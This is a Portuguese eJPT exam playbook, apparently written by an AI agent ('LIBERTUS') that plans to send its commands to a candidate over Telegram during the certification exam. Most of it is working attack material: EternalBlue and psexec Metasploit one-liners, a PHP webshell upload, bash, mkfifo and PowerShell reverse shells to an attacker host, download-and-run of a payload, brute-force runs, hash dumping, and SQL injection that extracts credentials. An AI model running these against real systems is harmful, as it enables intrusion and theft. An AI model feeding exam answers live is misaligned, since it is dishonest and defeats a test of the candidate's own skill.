# CENÁRIOS eJPT — Passo a Passo (v2)
**Atualizado 2026-10-19** (véspera do exame) — comandos **re-validados na máquina de apoio** nesta data.
Cada cenário = o que LIBERTUS manda pro Lorran colar, na ordem. `IP`=alvo, `LHOST`=IP do Kali (`ip addr`).

> Regra que vale para TODOS os cenários: **ler a pergunta do exame primeiro.** Ela diz qual host/serviço
> investigar. 48h é tempo demais para escanear tudo às cegas — mas nmap na rede no começo economiza horas.

---

## CENÁRIO 0 — Abertura (sempre igual, 3 comandos)

```bash
ip addr && ip route
```
```bash
nmap -sn 192.168.X.0/24 -oN ~/hosts.txt
```
```bash
nmap -sV -sC -p- -T4 -Pn IP -oN ~/scan_IP.txt
```
Ler o `-sC`: ele já entrega título HTTP, banner FTP/SSH, domínio SMB. **Metade das questões morre aqui.**
Anotar em bloco de notas: IP → portas → serviço/versão.

> Em rede local o `-sn` acha tudo por ARP. Se o alvo for roteado/pivô, `-Pn` sempre.
> `filtered` ≠ `down`: filtered = host vivo com firewall.

---

## CENÁRIO A — Porta 445 (SMB) → MS17-010 / EternalBlue
**O mais cobrado no eJPT.**

**A1 — Identificar versão e confirmar a vuln**
```bash
nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP
```
Saída que interessa: `OS: Windows Server 2008 R2 ...` e `State: VULNERABLE`.
Se o script não rodar (SMB2-only), cair para:
```bash
nmap -p445 --script smb-security-mode,smb2-security-mode IP
```

**A2 — Explorar (oneliner — evita copy/paste múltiplo no Kali web)**
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; set LPORT 4444; run"
```
Se aparecer `Cannot reliably check exploitability`:
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; set ForceExploit true; run"
```
Se der `ConnectionRefused`/`An unknown error occurred`: tentar 3-4 vezes (o exploit é instável por natureza),
ou trocar para `exploit/windows/smb/ms17_010_psexec`.

**A3 — Pós-exploração no meterpreter**
```bash
getuid ; sysinfo ; getprivs ; hashdump
```
`getuid` deve dizer `NT AUTHORITY\SYSTEM`. Depois:
```bash
shell
```
```cmd
whoami & hostname & ipconfig /all & type C:\Users\Administrator\Desktop\flag.txt
```
`ipconfig /all` mostra a **segunda interface** → é o gatilho do Cenário E (pivot).

**A4 — Se já tiver credenciais (achou em FTP/web/config)**
```bash
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS IP; set SMBUser USUARIO; set SMBPass SENHA; set LHOST LHOST; run"
```
Ou, sem metasploit:
```bash
smbclient -L //IP -U USUARIO
smbclient //IP/SHARE -U 'USUARIO%SENHA' -c 'ls'
smbclient //IP/SHARE -U 'USUARIO%SENHA' -c 'more arquivo.txt'   # 'cat' não existe nessa versão
```
**Alvo SMB1 antigo** (o cliente moderno recusa NT1 e mente com `NT_STATUS_CONNECTION_DISCONNECTED`):
```bash
smbclient -L //IP -N --option='client min protocol=NT1' --option='client max protocol=NT1'
smbclient //IP/SHARE -U 'usuario%senha' --option='client min protocol=NT1' --option='client max protocol=NT1' -c 'ls'
```
**Se não houver smbclient / para automatizar (Impacket, instalado hoje):**
```bash
~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP
~/venvs/pentest/bin/psexec.py usuario:'senha'@IP          # shell SYSTEM se a conta for admin
~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP
```
**Bruteforce SMB** (hydra local não tem módulo smb; no Kali da INE também não é o padrão):
```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; set PASS_FILE ~/pass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run"
```
Sempre tentar `smbclient //IP/C$ -U Administrator` com a senha achada — `C$` = disco inteiro.
Treino validado hoje: `172.28.77.11` shares `publico`(anônimo)/`financeiro`/`rh`, cred `analyst:LabPass123!`.

---

## CENÁRIO B — Porta 21 (FTP) → anônimo, credenciais, backdoor

**B1 — Testar anônimo**
```bash
nmap -p21 --script ftp-anon IP
```
**B2 — Entrar, listar escondidos e baixar tudo**
```bash
ftp IP
```
```
anonymous
(Enter)
ls -la
binary
mget *
bye
```
**B3 — Ler o que baixou (é aqui que mora a resposta)**
```bash
grep -riE "pass|user|login|key|admin" . 2>/dev/null
cat *.txt *.config *.bak 2>/dev/null
```
Arquivos típicos: `updates.txt`, `notes.txt`, `config.bak`, `backup.zip`. Credencial de FTP quase sempre
**reaproveita** em SSH/SMB/CMS — testar antes de brutar.

**B4 — vsftpd 2.3.4 (backdoor, aparece em prova)**
```bash
nmap -p21 -sV IP | grep vsftpd
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run"
```

**B5 — Credencial fraca (último recurso, hydra FTP funciona local)**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP -t 4 -f
```

---

## CENÁRIO C — Web (80 / 8080 / 443)

**C1 — Mapear**
```bash
nmap -p80,8080 --script http-enum,http-title,http-headers,http-methods IP
curl -s -i http://IP/ | head -20
```
`http-methods` com `PUT` habilitado = upload direto. `Server:` = Apache/IIS/nginx + versão.
`curl -s http://IP/robots.txt` e `/sitemap.xml` são grátis e frequentemente dão diretório.

**C2 — Enumerar diretórios**
```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 40 --no-error
```
- No **Kali da INE**: `/usr/share/wordlists/dirb/common.txt`.
- Local (apoio LIBERTUS): `~/wordlists/web/directory-list-2.3-small.txt` ou `medium`.
- SPA/Juice Shop devolve 200 em tudo → `--exclude-length N` (o próprio output diz o N).

Checar à mão sempre: `/admin`, `/login`, `/uploads`, `/backup`, `/config`, `/phpmyadmin`, `/server-status`,
`.git/`, `*.bak`, `*.old`, `phpinfo.php`, `/robots.txt`.

**C3 — SQL Injection (manual, 20 segundos, antes do sqlmap)**
```
http://IP/page.php?id=1'
http://IP/page.php?id=1 OR 1=1-- -
http://IP/page.php?id=1 ORDER BY 1,2,3,4-- -
```
Erro de SQL = injetável. UNION: `id=1 UNION SELECT 1,2,3-- -` (descobrir colunas pelo ORDER BY).
No DVWA local o `id=1' OR NOT 9097=9097#` e o UNION de 2 colunas foram **confirmados hoje**.

**C4 — SQL Injection automatizada (com sessão, do jeito que funciona)**
```bash
sqlmap -u "http://IP/login.php" --data="user=a&pass=b" --batch --dbs
```
Com cookie de sessão (área logada) — fluxo validado hoje no DVWA:
```bash
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=XXXX; security=low" --batch --dbs
sqlmap -u "<mesma>" --cookie="<mesma>" --batch -D dvwa -T users --dump
```
Extração real de hoje: `admin / 5f4dcc3b5aa765d61d8327deb882cf99` (md5 = `password`).
`--level 3 --risk 2` quando o básico não achar. `--os-shell` só se pedirem RCE.

**C5 — LFI / RFI**
```
http://IP/page.php?page=../../../../etc/passwd
http://IP/page.php?page=php://filter/convert.base64-encode/resource=index.php
```
Log poisoning: injetar `<?php system($_GET['c']); ?>` no User-Agent e incluir `/var/log/apache2/access.log`.

**C6 — Upload de webshell**
```bash
printf '<?php system($_GET["c"]); ?>' > ~/sh.php
```
Upload pelo formulário → acessar `http://IP/uploads/sh.php?c=id` (**no Kali web, digitar a URL na barra do Chrome**,
o terminal não digita `?`). Confirmou `uid=33(www-data)` → subir reverse shell (Cenário F).

**C7 — WordPress**
```bash
nmap -p80 --script http-wordpress-enum IP
curl -s http://IP/wp-json/wp/v2/users        # enumera usuários pela API REST
curl -s http://IP/?author=1                  # redireciona e revela o login
wpscan --url http://IP -e u,p --api-token X  # se existir no Kali
```
`/wp-content/plugins/` antigo + searchsploit/exploit-db = RCE. wp-admin com senha fraca → hydra http-post-form.

---

## CENÁRIO D — Porta 22 (SSH)

**D1 — Banner e métodos de auth**
```bash
nmap -p22 -sV --script ssh-auth-methods IP
```
**D2 — ANTES de brutar: testar credencial já obtida** (reuso é o tema nº1 do exame)
```bash
ssh usuario@IP
ssh -o PreferredAuthentications=password usuario@IP
```
Usuários prováveis: `root`, `admin`, `administrator`, `msfadmin`, `user`, `auditor`, nome achado em FTP/web.

**D3 — Bruteforce com user conhecido e wordlist curta**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f
hydra -L ~/users.txt -P ~/pass.txt ssh://IP -t 4 -f
```
**Nunca** rockyou inteiro em SSH (14M tentativas = horas). `-t 4` para não derrubar o sshd.
Fallbacks se hydra sem SSH (só no apoio local; no Kali INE hydra é completo):
```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
```
```bash
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -l root -P ~/wordlists/pass/top10k.txt -T 4 -s
```
```bash
nmap -p22 --script ssh-brute --script-args userdb=~/users.txt,passdb=~/wordlists/pass/top10k.txt IP
```

**D4 — Chave privada encontrada (FTP/web/backup)**
```bash
chmod 600 id_rsa
ssh -i id_rsa -o StrictHostKeyChecking=no usuario@IP
ssh2john id_rsa > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**D5 — Dentro: escalar (a pergunta costuma ser "qual o conteúdo de /root/flag.txt")**
```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null
cat /etc/passwd; ls -la /home/*
```
SUID clássico: `find . -exec /bin/sh -p \; -quit` (se `find` for SUID), `nmap --interactive` (antigo),
`/usr/bin/vim`, `pkexec` (PwnKit). Consultar GTFOBins.

---

## CENÁRIO E — Rede interna descoberta → PIVOTING (obrigatório)

**E1 — Achar a segunda rede (dentro da sessão)**
```bash
# meterpreter
run get_local_subnets
shell
```
```cmd
ipconfig /all & route print & arp -a
```
```bash
ip addr; ip route; arp -a          # se Linux
```
Guardar a rede nova (ex.: `10.10.10.0/24`).

**E2 — Rota pelo Metasploit**
```bash
background
route add 10.10.10.0 255.255.255.0 1     # 1 = id da sessão
route print
```
Ou, dentro do meterpreter: `run autoroute -s 10.10.10.0/24` (precisa do módulo `post/multi/manage/autoroute`).

**E3 — Escanear a rede interna pelo pivot**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 21,22,80,139,445,3306,3389,8080,10000
set THREADS 10
run
```

**E4 — Port forward para atacar do Kali**
```bash
# no meterpreter da sessão de borda:
portfwd add -l 445 -p 445 -r 10.10.10.20
portfwd add -l 3389 -p 3389 -r 10.10.10.20
portfwd list
```
Agora `127.0.0.1:445` no Kali = 445 do host interno → rodar `nmap -sV -p445 127.0.0.1`, `smbclient //127.0.0.1/share`.

**E5 — SOCKS para ferramentas que não têm módulo msf**
```bash
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run -j
```
```bash
proxychains nmap -sT -Pn -p80,445 10.10.10.20
```
Pitfall medido: via SOCKS o nmap só faz `connect()` em 80/443 por padrão → usar `-sT -Pn` e porta explícita.

**E6 — Novo alvo interno** → voltar ao Cenário A/B/C/D com o IP interno.

---

## CENÁRIO F — Reverse shell / transferência (depois de qualquer RCE)

**Listener no Kali**
```bash
nc -lvnp 4444
```
**Alvo Linux com bash**
```bash
bash -i >& /dev/tcp/LHOST/4444 0>&1
```
**Alvo Linux com nc sem `-e`**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
```
**Alvo Windows (webshell/cmd)**
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
**Estabilizar (Linux)**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z; stty raw -echo; fg; export TERM=xterm
```
**Metasploit handler para receber payload gerado**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f elf -o ~/sh.elf
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST LHOST; set LPORT 4444; run"
```
**Transferir arquivo (quando só há RCE web)**
```bash
# Kali serve:
python3 -m http.server 8000
# Alvo baixa:
wget http://LHOST:8000/sh.elf -O /tmp/sh.elf && chmod +x /tmp/sh.elf && /tmp/sh.elf
```
> Testado hoje: `nc -lvnp 4455` + `bash -i >& /dev/tcp/127.0.0.1/4455 0>&1` → **connection received**.
> O `nc` local é OpenBSD (sem `-e`) — usar as variantes acima.

---

## CENÁRIO G — Bônus que caem em prova

**G1 — 3389 RDP**
```bash
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info IP
msfconsole -q -x "use auxiliary/scanner/rdp/rdp_login; set RHOSTS IP; set USERNAME administrator; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; run"
xfreerdp /v:IP /u:USUARIO /p:SENHA /cert:ignore
```
BlueKeep (CVE-2019-0708) só em Win7/2008: `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`.

**G2 — 3306 MySQL**
```bash
nmap -p3306 --script mysql-info,mysql-enum IP
mysql -h IP -u root -p            # senha vazia / root / achada
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; run"
```
Dentro: `show databases; use X; show tables; select * from users;` (ir atrás de hash → john).

**G3 — 10000 Webmin** (clássico de rede interna no eJPT)
```bash
curl -sk https://IP:10000/ | head
# Webmin < 1.920 → CVE-2019-15107 (RCE sem auth)
searchsploit webmin    # ou exploit-db no navegador
```
No Metasploit: `exploit/linux/http/webmin_backdoor`.

**G4 — 139/445 com share aberto**
```bash
smbclient -L //IP -N
smbclient //IP/SHARE -N
enum4linux -a IP     # se existir no Kali
```

**G5 — 2049 NFS / 111 rpcbind**
```bash
showmount -e IP
mkdir /mnt/nfs && mount -t nfs IP:/export /mnt/nfs
```

---

## FLUXO MENTAL DO EXAME
1. `ip addr` → rede. 2. `nmap -sn /24` → hosts. 3. `nmap -sV -sC -p-` por host.
4. Porta aberta → cenário A/B/C/D. 5. Credencial achada → testar em TODOS os serviços.
6. Host com 2 redes → Cenário E. 7. **Anotar tudo** (IP, porta, user, senha, flag, caminho do arquivo).
8. Marcar questões dúbias e voltar depois — 48h, sem pressa.

## REGISTRO (fazer sempre)
```
HOST 10.10.10.20 | 21,22,80 | vsftpd 2.3.4 | cred: anonymous / vazio | achado: /var/www/notes.txt
```
Uma credencial anotada agora responde uma questão 3 horas depois.

---

# ADENDO 20/OUT — CORREÇÕES POR CENÁRIO (todas testadas na máquina hoje)

## Tabela de bolso: porta aberta → primeiro comando

| Porta | Primeiro comando (cola e roda) | Se der sinal positivo |
|---|---|---|
| 21 | `nmap -p21 --script ftp-anon IP` | Cenário B (anon → mget → grep cred) |
| 22 | `nmap -p22 -sV --script ssh-auth-methods IP` | Cenário D (reusar cred antes de brutar) |
| 80/443/8080 | `nmap -p80,8080 --script http-title,http-headers,http-methods IP` | Cenário C (gobuster → sqli → upload) |
| 139/445 | `nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP` | Cenário A (EternalBlue / psexec / shares) |
| 3306 | `nmap -p3306 --script mysql-info,mysql-enum IP` | `mysql -h IP -u root -p` |
| 3389 | `nmap -p3389 -sV --script rdp-ntlm-info IP` | msf `rdp_login` + `xfreerdp` |
| 10000 | `curl -sk https://IP:10000/ \| head` | Webmin < 1.920 → msf `webmin_backdoor` |
| 2049/111 | `showmount -e IP` | montar NFS e ler arquivos |
| rede extra | (dentro da sessão) `ipconfig /all` ou `ip addr` | Cenário E (autoroute → socks → proxychains) |

## A (SMB/445) — 4 correções

1. **Wordlist no msf sempre em `$HOME`** — `/usr/share/wordlists` não é legível pelo snap:
```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; \
 set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; \
 set VERBOSE true; run; exit -y"
```
2. **Share anônimo pelo msf não funciona** (`Invalid Cred details can't be blank`). Usar impacket:
```bash
~/venvs/pentest/bin/smbclient.py guest@IP -no-pass
```
3. **impacket `-port` só aceita 139/445** — host interno em porta escondida: usar a lib
```bash
~/venvs/pentest/bin/python -c "
from impacket.smbconnection import SMBConnection
c=SMBConnection('IP','IP',sess_port=4450,timeout=10); c.login('','')
print([s['shi1_netname'].rstrip(chr(0)) for s in c.listShares()])"
```
4. **`more` vs `cat`**: no `smbclient` do Samba é `more arquivo.txt`; no `smbclient.py` do impacket é `cat`.
   Confundir os dois custa minutos no exame.

## B (FTP/21) — 2 correções
- `hydra` FTP funciona localmente, **mas**: confirmar o acerto com login real (`ftp IP` → usuário/senha).
  Falso positivo de hydra já apareceu 2x nesta máquina.
- Depois de `mget *`, o ouro está em `grep -riE "pass|user|key|admin" .` e em `.bash_history`,
  `id_rsa`, `*.bak`, `.git/`. Credencial de FTP quase sempre vale em SSH/SMB/CMS: **testar antes de brutar**.

## C (Web) — 2 correções
- `gobuster` local: usar `~/wordlists/web/directory-list-2.3-small.txt` (87k) ou `raft-small-words.txt`.
  A lista `medium` (220k) só quando a small falhar (2-3 min por host).
- SQLi **com sessão** é o fluxo que extrai dados (validado hoje, ~10 s até o banner):
```bash
curl -s -c ~/ck.txt http://IP/login.php -o ~/login.html
TOKEN=$(grep -oP "user_token' value='\K[0-9a-f]+" ~/login.html)      # só se houver CSRF
curl -s -b ~/ck.txt -c ~/ck.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://IP/login.php
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$(grep PHPSESSID ~/ck.txt | awk '{print $7}');security=low" --batch --banner
```

## D (SSH/22) — a rota que funciona NESTA máquina
`hydra ssh` não existe localmente (`Compiled without LIBSSH`). As duas que funcionaram hoje,
contra o container 2222:
```bash
# 1) script próprio (paramiko) — mais rápido
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 -l root \
  -P ~/wordlists/pass/top10k.txt -T 4

# 2) Metasploit — abre sessão direto (VERBOSE true é obrigatório para ver o acerto)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set RPORT 22; \
 set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; \
 set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
# resultado real de hoje: [+] Success: 'msfadmin:msfadmin' + [*] SSH session 1 opened
```
No Kali do exame: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f`
(rockyou inteiro em SSH = 777-1943 h estimadas; usar `-f` e lista curta).

## E (Pivot) — agora com proxychains4 instalado
```bash
# 1) sessão de borda em background
background
# 2) rota + SOCKS
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
set SRVHOST 127.0.0.1
run -j
# 3) recon interno pelo proxy
proxychains4 nmap -sT -Pn -p22,80,445,8080,10000 10.10.10.0/24
```
Alternativa sem SOCKS: `portfwd add -l 8080 -p 80 -r 10.10.10.20` e atacar `127.0.0.1:8080`.
Regras do túnel: `-sT` (connect), `-Pn` sempre, `-p` explícito (sem porta o nmap só tenta 80/443
pelo proxy), UDP não passa.

## F (Shell/transferência) — 2 correções
- `msfvenom -o /tmp/x.elf` **mente** ("Saved as") e não grava: usar `-o ~/payloads/x.elf`.
- `nc` local é OpenBSD (sem `-e`): `bash -i >& /dev/tcp/LHOST/4444 0>&1` ou `mkfifo`.
  Testado hoje: listener 4555 recebeu os dados na hora.
- Servir arquivo para o alvo: `python3 -m http.server 8000` no Kali (funciona; não é snap).

## G (Bônus) — 1 correção
`searchsploit` **agora existe** nesta máquina (antes era "usar o navegador"):
```bash
searchsploit webmin 1.920
searchsploit -m 42315
```

---

# ADENDO 21/OUT — VALIDADO NO LAB HOJE (usar como resposta pronta)

Cada item abaixo foi executado hoje contra um alvo real do lab. Se Lorran mandar o cenário
correspondente no Telegram, é isto que eu respondo — sem inventar.

## C (Web) — SQLi autenticada: a sequência que funciona

O erro clássico é rodar sqlmap direto na URL e receber "not injectable" porque a página exige
sessão (redireciona pro login). Ordem correta:

```bash
# 1) descobre o formulário e se tem CSRF
curl -s http://IP/login.php | grep -iE "input|form action"

# 2) loga guardando a sessão (Python — modelo: ~/LIBERTUS/ejpt/web_login.py)
python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra "Login=Login"

# 3) valida manualmente que a injeção existe antes de gastar tempo com sqlmap
curl -s -H "Cookie: PHPSESSID=...; security=low" \
  "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit"

# 4) sqlmap com o cookie
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low" --batch --dbs --threads=4
```
Resultado real de hoje (DVWA): 4 técnicas — boolean-based blind, error-based, time-based blind,
UNION (2 colunas); DBMS `MySQL >= 5.0 (MariaDB fork)`; `--dbs` → `dvwa`.
Extração: `sqlmap ... --cookie="..." -D dvwa -T users -C user,password --dump --batch`.

**Se o alvo for SPA/JSON (Juice Shop e similares)** o sqlmap tende a desistir por causa do
parêntese. Payload manual verificada hoje:
```bash
curl -s -G "http://IP/rest/products/search" \
  --data-urlencode "q=test')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
# retornou a tabela Users: admin@juice-sh.op / 0192023a7bbd73250516f069df18b500 (md5 de admin123)
john --format=raw-md5 --wordlist=~/wordlists/pass/top10k.txt <(echo 'admin:0192023a7bbd73250516f069df18b500')
```

## B/C/D — hydra: onde ele engana (testado hoje)

`http-get` deu `login: admin password: admin` num formulário cuja senha real é `password`.
**Falso positivo.** Só usar com `F=` explícito:
```bash
hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```
Com CSRF token no formulário → hydra não serve (token muda por request); usar Python/`requests`
ou Burp Intruder.

## D (SSH) — comando exato desta máquina

```bash
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 \
  -l /home/libertus/wordlists/user/top-usernames.txt \
  -P /home/libertus/wordlists/pass/top10k.txt -T 8
```
Medido hoje: `msfadmin:msfadmin` em 0,1 s (2 tentativas, 2 threads). `python3` sem venv → falta
paramiko. Alternativa com sessão: `msf ssh_login` com `VERBOSE true`.

## A (SMB) e E (Pivot) — o que confirmar antes

```bash
# o banco do msf está de pé? (hoje: sim)
msfdb status | head -5

# módulo existe e está saudável? 2 segundos, evita travar no meio do cenário
msfconsole -q -x "info exploit/windows/smb/ms17_010_eternalblue; exit" | head -15

# scan que já entra no banco (pivot fica trivial depois)
db_nmap -sV -p445 IP ; services -p 445
```
Regra do snap que já custou tempo: **resource script só funciona em `$HOME` sem ponto no nome**
(`/tmp/x.rc` → "Cannot find resource script"; `~/.x.rc` → Permission denied; `~/x.rc` → OK).
Para 1-2 comandos, sempre `-x`.

## F (Shell/transferência) — nc confirmado

Listener `nc -lvnp 4444` + conexão real recebeu `LIBERTUS_NC_OK` hoje. `nc` é OpenBSD: **sem `-e`**.
Reverse shell:
```bash
bash -i >& /dev/tcp/LHOST/4444 0>&1
# ou
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST 4444 > /tmp/f
```

## Regra de ouro do dia
Antes de mandar qualquer comando pro Lorran no exame: **1) o alvo responde? 2) a ferramenta
existe nesta máquina? 3) a saída é coerente?** Se a saída for "boa demais" (senha achada na
primeira tentativa de http-get, banco inteiro sem esforço), desconfiar — hydra e sqlmap mentem.

---

# ADENDO 23/OUT — O LAB DE HOJE (IPs e portas reais, medidos 18:00–18:10)

Os cenários acima continuam válidos. O que muda é **onde praticar** e **o que cada alvo ensina**.

## Mapa do lab (6 alvos no ar)
| Cenário | Alvo real | Comando de entrada |
|---|---|---|
| A — SMB/445 | `172.28.77.11` (SRVLEGACY, Samba SMB1) | `nmap -Pn -p445 --script smb-os-discovery,smb-enum-shares,smb-security-mode IP` |
| A — SMB/445 moderno | `172.28.77.12` (SMB2/3) | `nmap -Pn -p445 -sV IP` + `smb_login` |
| B — FTP/21 | `127.0.0.1:2121` (vsftpd 3.0.2) | `hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t4 -f ftp://127.0.0.1:2121` |
| C — Web | `localhost:8080` DVWA · `localhost:3000` Juice | `gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/common.txt` |
| C — SQLi autenticada | DVWA `security=low` | `web_login.py` → cookie → `sqlmap --cookie` |
| D — SSH/22 | `127.0.0.1:2222` | `ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -w msfadmin` |
| E — Pivot | rede `libertus-labnet` (172.28.77.0/24) | precisa de foothold primeiro — ver Cenário E |

## A (445) — o que o lab ensina e o que ele NÃO ensina
Rodado hoje: guest READ/WRITE em `publico`; `financeiro` e `rh` só com credencial.
`smb_ms17_010` respondeu **"Host does NOT appear vulnerable"** — correto, porque é Samba.
- **Ensinar no lab:** enumeração de shares, creds fracas, `smb_login`, montagem do share.
- **Não ensina:** EternalBlue real. Para treinar o exploit, precisa Windows (HTB / Metasploitable3).
- No exame, se o 445 for Windows: confirmar com `smb_ms17_010` e só então `ms17_010_eternalblue`.

## B (21) — hydra de verdade, com prova
```bash
hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t 4 -f ftp://IP:21
ftp IP        # confirmar na mão com as credenciais achadas
```
Hoje: acertou em ~1 s no lab. **FTP é o módulo do hydra que funciona nesta máquina** (SSH/RDP não).

## C (Web) — números de hoje
- `gobuster` common.txt → `/config/`, `/docs/`, `/external/`, `/login.php`, `/robots.txt`, `/php.ini`, `.gitignore`.
- `sqlmap` autenticado → 4 técnicas, bancos `dvwa` e `information_schema`.
- Juice Shop: sqlmap desiste; UNION manual no `/rest/products/search` funciona.

### C → upload de webshell → RCE → reverse shell (VALIDADO hoje, ponta a ponta)
Sequência exata, com o que funcionou de verdade (não é teoria):
```bash
# 1) sessão (o DVWA 1.10 desta imagem NÃO usa CSRF na página de upload)
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password
# -> COOKIE: PHPSESSID=...; security=low

# 2) webshell
printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -b "PHPSESSID=SEU; security=low" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" -F "Upload=Upload" \
  http://IP/vulnerabilities/upload/

# 3) prova de execução
curl -s "http://IP/hackable/uploads/shell.php?c=id"
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 4) reverse shell (URL-encode o comando!)
#    bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
nc -lvnp 4444            # no seu Kali, ANTES de disparar
```
Resultado real de hoje: conexão recebida do container, shell `www-data`, `id`/`hostname`/`pwd` respondendo.
Detalhe que custa tempo: o botão do form é **`Upload` com U maiúsculo**; e o caminho final do arquivo é
sempre `/hackable/uploads/<nome>`. Se der 404, o upload não gravou — cheque a mensagem na resposta.


## D (SSH) — comando exato validado hoje
```bash
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -w msfadmin
# [+] SUCESSO: msfadmin:msfadmin  (0,1 s)
ssh -p 2222 msfadmin@127.0.0.1     # confirmar shell
```

## E (Pivot) — status honesto
Não testei pivot ponta a ponta hoje porque **não há sessão/foothold aberta** no lab. A cadeia
(`get_local_subnets` → `run autoroute -s REDE/24` → `use auxiliary/server/socks_proxy` →
`proxychains nmap -Pn -sT -p- IP`) continua sendo a correta e está detalhada no Cenário E acima.
Treinar isso exige primeiro comprometer o `172.28.77.11` e usar ele como ponte para o `.12` —
é o exercício recomendado para a próxima sessão de treino.



